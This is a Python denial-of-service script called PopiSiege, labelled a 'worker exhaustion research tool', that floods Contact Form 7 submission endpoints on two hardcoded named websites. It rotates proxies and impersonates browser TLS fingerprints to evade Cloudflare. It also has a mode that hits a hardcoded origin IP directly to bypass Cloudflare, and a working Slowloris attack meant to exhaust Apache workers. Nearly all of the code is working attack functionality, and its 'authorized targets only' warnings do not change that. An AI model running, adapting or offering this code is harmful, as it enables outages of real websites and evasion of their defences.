#!/usr/bin/env python3
"""
PopiSiege VPS Edition
CF7 Worker Exhaustion Research Tool
Runs continuously until Ctrl+C
Proxy rotation per request — browser User-Agent

Usage:
  python3 popisiege.py
  python3 popisiege.py --target metoo-buffalo.com
  python3 popisiege.py --target metoo-shatkin.com --concurrency 30
  python3 popisiege.py --origin 104.236.68.226                   # PoC: bypass CF, hit origin directly
  python3 popisiege.py --origin 104.236.68.226 --concurrency 5   # gentle probe for log evidence
  python3 popisiege.py --slowloris --origin 104.236.68.226        # Slowloris: exhaust Apache workers
  python3 popisiege.py --slowloris --origin 104.236.68.226 --connections 200 --interval 10
  python3 popisiege.py --help
"""

import requests, time, sys, threading, itertools, argparse, subprocess
import os, socket, random
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from curl_cffi import requests as cf_requests
from curl_cffi import CurlMime

# Chrome TLS/JA3 fingerprint to impersonate — plain `requests`/curl present a
# distinct fingerprint that Cloudflare blocks even with a spoofed UA string.
IMPERSONATE = "chrome124"

G = "\033[0;32m"; R = "\033[0;31m"; Y = "\033[0;33m"
C = "\033[0;36m"; W = "\033[0m";    B = "\033[1m"

BROWSER_UA = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/124.0.0.0 Safari/537.36"
)

# Real, current browser profiles — (curl_cffi impersonate target, matching UA).
# UA and TLS fingerprint are kept consistent on purpose: a modern TLS handshake
# paired with a stale/mismatched UA string is itself a detectable signal (tested
# against metoo-shatkin.com — an old-UA/modern-TLS mismatch wasn't flagged there,
# but other WAFs do check this, so don't rely on it holding everywhere).
BROWSER_PROFILES = [
    ("chrome136", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"),
    ("chrome142", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36"),
    ("chrome145", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36"),
    ("chrome146", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36"),
    ("chrome131_android", "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36"),
    ("chrome99_android", "Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 Mobile Safari/537.36"),
    ("chrome123", "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36"),
    ("chrome119", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"),
    ("chrome110", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"),
    ("edge101", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36 Edg/101.0.1210.53"),
    ("edge99", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36 Edg/99.0.1150.30"),
    ("safari184", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.4 Safari/605.1.15"),
    ("safari184_ios", "Mozilla/5.0 (iPhone; CPU iPhone OS 18_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.4 Mobile/15E148 Safari/604.1"),
    ("safari180_ios", "Mozilla/5.0 (iPad; CPU OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1"),
    ("safari170", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15"),
    ("firefox135", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0"),
    ("firefox144", "Mozilla/5.0 (X11; Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0"),
    ("firefox147", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:147.0) Gecko/20100101 Firefox/147.0"),
    ("firefox133", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:133.0) Gecko/20100101 Firefox/133.0"),
]

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
PROXY_FILE = os.path.join(SCRIPT_DIR, "proxies.txt")

# ── known targets ─────────────────────────────────────────────────────────────
TARGETS = {
    "metoo-shatkin.com": {
        "url":      "https://metoo-shatkin.com/wp-json/contact-form-7/v1/contact-forms/50/feedback",
        "form_id":  "50",
        "unit_tag": "wpcf7-f50-p30-o1",
        "threshold": 19,
    },
    "metoo-buffalo.com": {
        "url":      "https://metoo-buffalo.com/wp-json/contact-form-7/v1/contact-forms/248/feedback",
        "form_id":  "248",
        "unit_tag": "wpcf7-f248-p850-o1",
        "threshold": 25,
    },
}


# ─────────────────────────────────────────────────────────────────────────────
#  BROWSER PROFILE CYCLE — round-robin like ProxyPool, so a single burst never
#  repeats a profile until the whole pool is exhausted (random.choice could
#  pick the same one twice by chance; this guarantees it doesn't).
# ─────────────────────────────────────────────────────────────────────────────

class ProfileCycle:
    def __init__(self, profiles):
        self.profiles = profiles
        self._cycle = itertools.cycle(profiles)
        self._lock  = threading.Lock()

    def next(self):
        with self._lock:
            return next(self._cycle)


PROFILE_CYCLE = ProfileCycle(BROWSER_PROFILES)


# ─────────────────────────────────────────────────────────────────────────────
#  PROXY POOL
# ─────────────────────────────────────────────────────────────────────────────

class ProxyPool:
    def __init__(self, path):
        # Authenticated proxy lists (Webshare etc.) ship as bare host:port —
        # credentials come from PROXY_USER/PROXY_PASS env vars at load time,
        # so no secret ever lands in a file that could get committed.
        user = os.environ.get("PROXY_USER", "")
        pw   = os.environ.get("PROXY_PASS", "")
        with open(path) as f:
            raw = [l.strip() for l in f if l.strip()]
        self.proxies = []
        for p in raw:
            if p.startswith(("http://", "https://", "socks")):
                self.proxies.append(p)
            elif "@" in p:
                # host:port:user:pass  (Webshare export format)
                parts = p.split(":")
                if len(parts) == 4:
                    h, port, u, pwd = parts
                    self.proxies.append(f"http://{u}:{pwd}@{h}:{port}")
                else:
                    self.proxies.append(f"http://{p}")
            elif p.count(":") == 3:
                # host:port:user:pass  (Webshare export format)
                h, port, u, pwd = p.split(":")
                self.proxies.append(f"http://{u}:{pwd}@{h}:{port}")
            elif user and pw:
                self.proxies.append(f"http://{user}:{pw}@{p}")
            else:
                self.proxies.append(f"http://{p}")
        self._cycle = itertools.cycle(self.proxies)
        self._lock  = threading.Lock()
        self._dead  = set()
        print(f"  {G}[PROXY]{W} {len(self.proxies)} proxies loaded from {path}")

    def next(self):
        with self._lock:
            for _ in range(len(self.proxies)):
                p = next(self._cycle)
                if p not in self._dead:
                    return p
        return None

    def mark_dead(self, proxy):
        with self._lock:
            self._dead.add(proxy)

    def alive(self):
        return len(self.proxies) - len(self._dead)

    def refresh(self, proxy_file):
        """Reset dead set and cycle through bundled proxies again."""
        print(f"\n  {Y}[PROXY]{W} Pool exhausted — resetting and cycling through proxies again...\n")
        with self._lock:
            self._dead  = set()
            self._cycle = itertools.cycle(self.proxies)
        print(f"\n  {G}[PROXY]{W} Reset — {len(self.proxies)} proxies back in rotation.\n")


# ─────────────────────────────────────────────────────────────────────────────
#  PAYLOAD
# ─────────────────────────────────────────────────────────────────────────────

def build_files(form_id, unit_tag):
    return {
        "_wpcf7":          (None, form_id),
        "_wpcf7_version":  (None, "6.1.6"),
        "_wpcf7_locale":   (None, "en_US"),
        "_wpcf7_unit_tag": (None, unit_tag),
        "your-name":       (None, "Test User"),
        "your-email":      (None, "test@test.com"),
        "your-subject":    (None, "Test"),
        "your-message":    (None, "Hello"),
    }


def build_multipart(form_id, unit_tag):
    """curl_cffi needs CurlMime, not the requests-style files dict."""
    mp = CurlMime()
    mp.addpart(name="_wpcf7", data=form_id)
    mp.addpart(name="_wpcf7_version", data="6.1.6")
    mp.addpart(name="_wpcf7_locale", data="en_US")
    mp.addpart(name="_wpcf7_unit_tag", data=unit_tag)
    mp.addpart(name="your-name", data="Test User")
    mp.addpart(name="your-email", data="test@test.com")
    mp.addpart(name="your-subject", data="Test")
    mp.addpart(name="your-message", data="Hello")
    return mp


# ─────────────────────────────────────────────────────────────────────────────
#  SINGLE REQUEST
# ─────────────────────────────────────────────────────────────────────────────

def send_one(req_num, cfg, pool):
    proxy = None
    if pool is not None:
        proxy = pool.next()
        if not proxy:
            return req_num, 0, 0, "N/A", "none", "all proxies dead"

    domain = cfg["url"].split("/")[2]
    label  = proxy if proxy else "direct (own IP)"
    impersonate, ua = PROFILE_CYCLE.next()

    t0 = time.time()
    try:
        r = cf_requests.post(
            cfg["url"],
            multipart=build_multipart(cfg["form_id"], cfg["unit_tag"]),
            headers={"Origin": f"https://{domain}", "Referer": f"https://{domain}/", "User-Agent": ua},
            proxies={"http": proxy, "https": proxy} if proxy else None,
            impersonate=impersonate,
            timeout=25,
        )
        elapsed = time.time() - t0
        cache   = r.headers.get("cf-cache-status", "N/A")
        mit     = r.headers.get("cf-mitigated", "")
        # cf-mitigated present = Cloudflare intercepted, not the origin
        code    = r.status_code if not mit else 999
        return req_num, code, elapsed, cache, label, (f"cf-mitigated={mit}" if mit else None)
    except Exception as e:
        elapsed = time.time() - t0
        if pool is not None:
            pool.mark_dead(proxy)
        return req_num, 0, elapsed, "N/A", label, str(e)[:40]


def send_one_direct(req_num, cfg, origin_ip):
    """
    --origin mode: bypass Cloudflare entirely.
    Hits origin IP directly with Host header — appears in Apache logs
    WITHOUT CF-Connecting-IP header. Proves direct origin attack for PoC/legal.
    """
    domain   = cfg["url"].split("/")[2]
    path     = "/" + "/".join(cfg["url"].split("/")[3:])
    # Use HTTP (port 80) — HTTPS would fail cert check on raw IP
    url      = f"http://{origin_ip}{path}"

    s = requests.Session()
    s.headers.update({
        "User-Agent": BROWSER_UA,
        "Host":       domain,
        "Origin":     f"https://{domain}",
        "Referer":    f"https://{domain}/",
    })
    s.verify = False

    t0 = time.time()
    try:
        r       = s.post(url, files=build_files(cfg["form_id"], cfg["unit_tag"]), timeout=15)
        elapsed = time.time() - t0
        # Key evidence: CF-Connecting-IP absent = direct hit, not CF-proxied
        cf_ip   = r.headers.get("CF-Connecting-IP", "ABSENT")
        via_cf  = r.headers.get("Via", "ABSENT")
        return req_num, r.status_code, elapsed, cf_ip, via_cf, None
    except Exception as e:
        elapsed = time.time() - t0
        return req_num, 0, elapsed, "ABSENT", "ABSENT", str(e)[:60]


# ─────────────────────────────────────────────────────────────────────────────
#  SLOWLORIS
# ─────────────────────────────────────────────────────────────────────────────

def _sl_open_socket(host, port, domain):
    """
    Slowloris socket init: complete TCP handshake, send partial HTTP headers.
    Never sends the final blank line — server hangs waiting for the rest.
    """
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(4)
    try:
        s.connect((host, port))
        s.send(f"GET /?r={random.randint(0, 99999)} HTTP/1.1\r\n".encode())
        s.send(f"Host: {domain}\r\n".encode())
        s.send(b"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
               b"AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36\r\n")
        s.send(b"Accept: text/html,application/xhtml+xml,*/*;q=0.8\r\n")
        s.send(b"Accept-Language: en-US,en;q=0.5\r\n")
        s.send(b"Connection: keep-alive\r\n")
        # intentionally NO final \r\n — request stays incomplete
        return s
    except socket.error:
        try: s.close()
        except: pass
        return None


def _sl_server_alive(host, port, domain):
    """Quick HEAD check — returns True if server responds at all."""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(3)
    try:
        s.connect((host, port))
        s.send(f"HEAD / HTTP/1.0\r\nHost: {domain}\r\n\r\n".encode())
        resp = s.recv(16)
        s.close()
        return len(resp) > 0
    except Exception:
        try: s.close()
        except: pass
        return False


def run_slowloris(host, port, domain, max_connections, interval):
    """
    Slowloris attack: hold open max_connections partial-HTTP sockets.
    Every interval seconds, drip one header line to reset server timeout.
    Apache's MaxRequestWorkers (default 150) fills up → new requests refused.
    """
    sockets       = []
    total_dead    = 0
    start         = time.time()

    print(f"""
{B}{'='*66}{W}
  PopiSiege — SLOWLORIS MODE
{B}{'='*66}{W}
  Target      : {host}:{port}
  Domain      : {domain}
  Connections : up to {max_connections}
  Drip rate   : every {interval}s
  Attack      : Partial HTTP headers — never complete request
  Effect      : Exhausts Apache MaxRequestWorkers (~150 default)
{R}  WARNING     : Authorized targets only.{W}
{B}{'='*66}{W}
""")

    # ── Phase 1: flood open connections ──────────────────────────────────────
    print(f"  {Y}[PHASE 1]{W} Opening {max_connections} sockets...")
    for i in range(max_connections):
        s = _sl_open_socket(host, port, domain)
        if s:
            sockets.append(s)
        if (i+1) % 25 == 0 or i == max_connections - 1:
            failed = (i+1) - len(sockets)
            print(f"\r    Opened={len(sockets)}  Failed={failed}  ({i+1}/{max_connections})",
                  end="", flush=True)
    print()

    print(f"\n  {G}[PHASE 1 DONE]{W} Holding {len(sockets)} connections open\n")

    # ── Phase 2: drip loop ────────────────────────────────────────────────────
    print(f"  {Y}[PHASE 2]{W} Drip loop — header every {interval}s. Ctrl+C to stop.\n")

    round_num = 0
    try:
        while True:
            round_num += 1
            ts = datetime.now().strftime("%H:%M:%S")

            # Send one partial header line on every live socket
            dead_idx = []
            for i, s in enumerate(sockets):
                try:
                    s.send(f"X-a: {random.randint(1, 9999)}\r\n".encode())
                except socket.error:
                    dead_idx.append(i)

            # Replace dead sockets with fresh ones
            for i in reversed(dead_idx):
                sockets.pop(i)
                total_dead += 1
                ns = _sl_open_socket(host, port, domain)
                if ns:
                    sockets.append(ns)

            alive = _sl_server_alive(host, port, domain)
            status_str = (R + "DOWN  ⚠️  Workers likely exhausted" + W
                          if not alive else G + "ALIVE" + W)

            print(f"  {C}[Round {round_num:>4}]{W} {ts} | "
                  f"Sockets={len(sockets)}/{max_connections} | "
                  f"Dead(total)={total_dead} | "
                  f"Server={status_str} | "
                  f"Runtime={time.time()-start:.0f}s")

            time.sleep(interval)

    except KeyboardInterrupt:
        print(f"\n\n  {Y}[STOPPED]{W} Ctrl+C\n")
        print(f"  Closing {len(sockets)} hanging sockets...")
        for s in sockets:
            try: s.close()
            except: pass

    runtime = time.time() - start
    print(f"\n{B}{'='*66}{W}")
    print(f"  SLOWLORIS SUMMARY")
    print(f"{B}{'='*66}{W}")
    print(f"  Target      : {host}:{port}  ({domain})")
    print(f"  Runtime     : {runtime:.0f}s")
    print(f"  Rounds      : {round_num}")
    print(f"  Peak open   : {max_connections}")
    print(f"  Total dead  : {total_dead}")
    print(f"{B}{'='*66}{W}\n")


# ─────────────────────────────────────────────────────────────────────────────
#  BURST — fire N concurrent requests
# ─────────────────────────────────────────────────────────────────────────────

def burst(concurrency, cfg, pool, verbose):
    ok = []; err = []; times = []
    with ThreadPoolExecutor(max_workers=concurrency) as ex:
        futures = [ex.submit(send_one, i, cfg, pool) for i in range(1, concurrency+1)]
        for f in as_completed(futures):
            num, code, elapsed, cache, proxy, error = f.result()
            short = proxy.replace("http://","").replace("https://","")[:22]
            if code == 200:
                ok.append(code); times.append(elapsed)
            else:
                err.append(code)
            if verbose:
                sym = G+"[✓]"+W if code==200 else R+"[✗]"+W
                detail = f"HTTP={code or 'ERR':<3} | Time={elapsed:.2f}s | Cache={cache}"
                if error: detail += f" | {error}"
                print(f"    {sym} Req {num:>3} | {short:<22} | {detail}")
    return ok, err, times


# ─────────────────────────────────────────────────────────────────────────────
#  MAIN
# ─────────────────────────────────────────────────────────────────────────────

def main():
    p = argparse.ArgumentParser(
        description="PopiSiege VPS — CF7 worker exhaustion research tool",
        formatter_class=argparse.RawTextHelpFormatter
    )
    p.add_argument("--target",      default="metoo-shatkin.com",
                   help=f"Target domain (default: metoo-shatkin.com)\nAvailable: {', '.join(TARGETS)}")
    p.add_argument("--concurrency", type=int, default=None,
                   help="Concurrent requests per burst (default: auto from known threshold)")
    p.add_argument("--proxy-file",  default=PROXY_FILE,
                   help=f"Path to proxy list file (default: {PROXY_FILE})")
    p.add_argument("--no-proxy",    action="store_true",
                   help="Skip the proxy pool entirely — send every request from this\n"
                        "machine's own IP (still uses TLS impersonation).")
    p.add_argument("--verbose",     action="store_true",
                   help="Show every request")
    p.add_argument("--delay",       type=float, default=0,
                   help="Seconds between bursts (default: 0)")
    p.add_argument("--origin",      default=None, metavar="IP",
                   help="PoC mode: bypass Cloudflare, hit origin IP directly\n"
                        "Example: --origin 104.236.68.226\n"
                        "Requests appear in Apache logs WITHOUT CF-Connecting-IP\n"
                        "Proves direct origin attack for legal/court evidence")
    p.add_argument("--slowloris",   action="store_true",
                   help="Slowloris mode: exhaust Apache connection pool with partial HTTP sockets\n"
                        "Use with --origin to bypass Cloudflare (CF absorbs Slowloris at edge)\n"
                        "Example: --slowloris --origin 104.236.68.226")
    p.add_argument("--connections", type=int, default=200,
                   help="Slowloris: max hanging connections (default: 200, Apache default limit=150)")
    p.add_argument("--interval",    type=float, default=10,
                   help="Slowloris: seconds between header drips (default: 10)")
    p.add_argument("--port",        type=int, default=80,
                   help="Slowloris: target port (default: 80; use 8080 if needed)")
    args = p.parse_args()

    # ── slowloris: domain not required, can run standalone with --origin ─────
    if args.slowloris:
        if args.origin:
            sl_host   = args.origin
            sl_domain = args.target.replace("https://","").replace("http://","").strip("/")
        else:
            # no --origin: resolve domain to IP (goes through CF edge — less effective on origin)
            sl_domain = args.target.replace("https://","").replace("http://","").strip("/")
            try:
                sl_host = socket.gethostbyname(sl_domain)
            except socket.gaierror as e:
                print(f"\n  {R}[ERROR]{W} Cannot resolve {sl_domain}: {e}\n"
                      f"  Tip: use --origin <IP> to bypass Cloudflare and hit origin directly.\n")
                sys.exit(1)
            print(f"\n  {Y}[WARN]{W} No --origin given. Resolved {sl_domain} → {sl_host}")
            print(f"  {Y}[WARN]{W} Cloudflare will absorb this. Use --origin for origin testing.\n")
        run_slowloris(sl_host, args.port, sl_domain, args.connections, args.interval)
        return

    # ── resolve target ────────────────────────────────────────────────────────
    domain = args.target.replace("https://","").replace("http://","").strip("/")
    if domain not in TARGETS:
        print(f"\n  {R}[ERROR]{W} Unknown target: {domain}")
        print(f"  Known: {', '.join(TARGETS)}\n")
        print(f"  To add a new target, use: --target <domain>")
        sys.exit(1)

    cfg         = TARGETS[domain]
    concurrency = args.concurrency or cfg["threshold"]

    # ── load proxies (or skip entirely with --no-proxy) ────────────────────────
    if args.no_proxy:
        pool = None
    else:
        try:
            pool = ProxyPool(args.proxy_file)
        except FileNotFoundError:
            print(f"\n  {R}[ERROR]{W} Proxy file not found: {args.proxy_file}")
            print(f"  Run: python3 proxy_tester.py\n")
            sys.exit(1)

    # ── origin PoC mode ───────────────────────────────────────────────────────
    if args.origin:
        print(f"""
{B}{'='*66}{W}
  PopiSiege — ORIGIN BYPASS MODE (PoC / Legal Evidence)
{B}{'='*66}{W}
  Origin IP   : {args.origin}
  Domain      : {domain}
  Endpoint    : http://{args.origin}/<cf7-path>
  Host Header : {domain}
  Concurrency : {concurrency} per burst
  Mode        : Direct origin hit — bypasses Cloudflare entirely
  Evidence    : CF-Connecting-IP=ABSENT in response = direct attack proof
{R}  WARNING     : Requests hit origin server directly — will appear in{W}
{R}              : Apache logs. Use only on authorised targets.{W}
{B}{'='*66}{W}
""")
        total_ok = 0; total_err = 0; burst_num = 0; start = time.time()
        try:
            while True:
                burst_num += 1
                ts = datetime.now().strftime("%H:%M:%S")
                with ThreadPoolExecutor(max_workers=concurrency) as ex:
                    futures = [ex.submit(send_one_direct, i, cfg, args.origin)
                               for i in range(1, concurrency+1)]
                    for f in as_completed(futures):
                        num, code, elapsed, cf_ip, via, err = f.result()
                        sym = G+"[✓]"+W if code in (200,403) else R+"[✗]"+W
                        hit_type = (R+"DIRECT HIT (no CF)"+W
                                    if cf_ip == "ABSENT"
                                    else G+"CF-proxied"+W)
                        status = f"HTTP={code or 'ERR':<3} | {elapsed:.2f}s | CF-IP={cf_ip} | {hit_type}"
                        if err: status += f" | {err}"
                        print(f"  {sym} [{ts}] Req {num:>2} | {status}")
                        if code in (200, 403): total_ok += 1
                        else: total_err += 1
                print(f"  {C}[Burst {burst_num}]{W} Done | "
                      f"OK={total_ok} ERR={total_err} | Runtime={time.time()-start:.0f}s\n")
                if args.delay > 0:
                    time.sleep(args.delay)
        except KeyboardInterrupt:
            print(f"\n  {Y}[STOPPED]{W} Ctrl+C\n"
                  f"  Total direct hits: {total_ok+total_err} | "
                  f"Runtime: {time.time()-start:.0f}s\n")
        return

    print(f"""
{B}{'='*66}{W}
  PopiSiege VPS — CF7 Worker Exhaustion
{B}{'='*66}{W}
  Target      : {cfg['url']}
  Form ID     : {cfg['form_id']}
  Unit Tag    : {cfg['unit_tag']}
  Concurrency : {concurrency} per burst  (threshold = {cfg['threshold']})
  Proxies     : {(str(pool.alive()) + " alive — rotating per request") if pool else "NONE — sending from this machine's own IP"}
  TLS         : rotating {len(BROWSER_PROFILES)} real browser profiles (TLS+UA matched per request)
  Mode        : Continuous until Ctrl+C
{B}{'='*66}{W}
""")

    # ── stats ─────────────────────────────────────────────────────────────────
    total_ok  = 0
    total_err = 0
    burst_num = 0
    all_times = []
    start     = time.time()

    try:
        while True:
            burst_num += 1
            ts = datetime.now().strftime("%H:%M:%S")

            if not args.verbose:
                proxy_status = f"Proxies alive={pool.alive()}" if pool else "Direct (own IP)"
                print(f"  {C}[Burst {burst_num:>4}]{W} {ts} | "
                      f"{proxy_status} | Sending {concurrency}...",
                      end="", flush=True)

            ok, err, times = burst(concurrency, cfg, pool, args.verbose)

            total_ok  += len(ok)
            total_err += len(err)
            all_times += times

            avail  = len(ok) / concurrency * 100
            avg_t  = sum(times)/len(times) if times else 0
            run_t  = time.time() - start

            if avail >= 80:   status = G+"STABLE"+W
            elif avail >= 30: status = Y+"DEGRADED"+W
            else:             status = R+"DOWN"+W

            if not args.verbose:
                print(f"\r  {C}[Burst {burst_num:>4}]{W} {ts} | "
                      f"OK={len(ok)}/{concurrency} | "
                      f"Avail={avail:>5.1f}% | "
                      f"Avg={avg_t:.2f}s | "
                      f"Status={status} | "
                      f"Runtime={run_t:.0f}s")
            else:
                print(f"\n  {C}[Burst {burst_num}]{W} OK={len(ok)}/{concurrency} | "
                      f"Avail={avail:.1f}% | Avg={avg_t:.2f}s | {status}\n")

            if pool is not None and pool.alive() == 0:
                pool.refresh(args.proxy_file)

            if args.delay > 0:
                time.sleep(args.delay)

    except KeyboardInterrupt:
        print(f"\n\n  {Y}[STOPPED]{W} Ctrl+C received.\n")

    # ── final report ──────────────────────────────────────────────────────────
    runtime = time.time() - start
    total   = total_ok + total_err

    print(f"{B}{'='*66}{W}")
    print(f"  FINAL REPORT")
    print(f"{B}{'='*66}{W}")
    print(f"  Target        : {cfg['url']}")
    print(f"  Runtime       : {runtime:.0f}s")
    print(f"  Bursts fired  : {burst_num}")
    print(f"  Total requests: {total}")
    print(f"  200 OK        : {total_ok}  ({total_ok/total*100:.1f}%)" if total else "  No data")
    print(f"  Errors        : {total_err}  ({total_err/total*100:.1f}%)" if total else "")
    if all_times:
        print(f"  Avg resp time : {sum(all_times)/len(all_times):.2f}s")
        print(f"  Max resp time : {max(all_times):.2f}s")
    if pool is not None:
        print(f"  Proxies dead  : {len(pool._dead)}/{len(pool.proxies)}")
    print(f"  RPS           : {total/runtime:.2f}" if runtime > 0 else "")
    print(f"{B}{'='*66}{W}\n")


if __name__ == "__main__":
    main()
